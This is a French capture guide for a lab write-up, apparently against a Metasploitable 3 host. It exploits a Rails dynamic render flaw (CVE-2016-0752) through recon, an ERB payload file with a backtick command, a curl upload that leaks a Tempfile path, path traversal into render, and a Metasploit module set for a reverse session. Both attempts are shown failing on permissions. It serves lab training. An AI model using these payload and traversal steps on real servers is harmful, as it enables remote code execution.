# Captures — WEBrick / Rails Dynamic Render (MS3)

Consignes de capture pour `services/ms3-webrick-rails-render.html`. Commandes identiques à
celles du write-up source : `ms3/jules/webrick-rails-render.md`.

## 01-recon-relance.png

```bash
nmap -sC -sV -p 3500 172.28.128.3
# puis, via le shell déjà obtenu sur la cible :
cat /opt/readme_app/start.sh
```

Encadrer en rouge : `3500/tcp closed` d'abord, puis après relance manuelle,
`WEBrick::HTTPServer#start: pid=... port=3500`.

## 02-recherche-module.png

```bash
cat /opt/readme_app/app/controllers/readme_controller.rb
searchsploit rails render
msfconsole -q -x "search rails render; info exploit/multi/http/rails_dynamic_render_code_exec; exit"
```

Encadrer en rouge : la ligne `render template` dans le contrôleur, et `CVE-2016-0752` dans la
sortie `info`.

## 03-fuite-tempfile.png

```bash
printf '%s' '<%= `id` %>' > payload.gif
curl -s -X GET "http://172.28.128.3:3500/readme?os=nonexistent_template_xyz" -F "evil=@payload.gif;type=image/gif"
```

Encadrer en rouge : `Tempfile:/tmp/RackMultipart...gif` dans la réponse d'erreur.

## 04-traversee-render.png

```bash
curl -s -G "http://172.28.128.3:3500/readme" --data-urlencode "os=../../../../tmp/RackMultipart...jw7bx8"
```

Encadrer en rouge : le changement d'erreur — `Errno::EACCES` au lieu de
`ActionView::MissingTemplate` — preuve que le fichier a été localisé et le rendu entamé.

## 05-metasploit-echec.png

```bash
msfconsole -q -x "use exploit/multi/http/rails_dynamic_render_code_exec; set RHOSTS 172.28.128.3; set RPORT 3500; set URIPATH /readme; set SRVHOST 172.28.128.1; set LHOST 172.28.128.1; set LPORT 4495; exploit; sleep 10; sessions -l; exit -y"
```

Encadrer en rouge : `Exploit completed, but no session was created` — même blocage que
l'exploitation manuelle, pour la même cause de permissions.
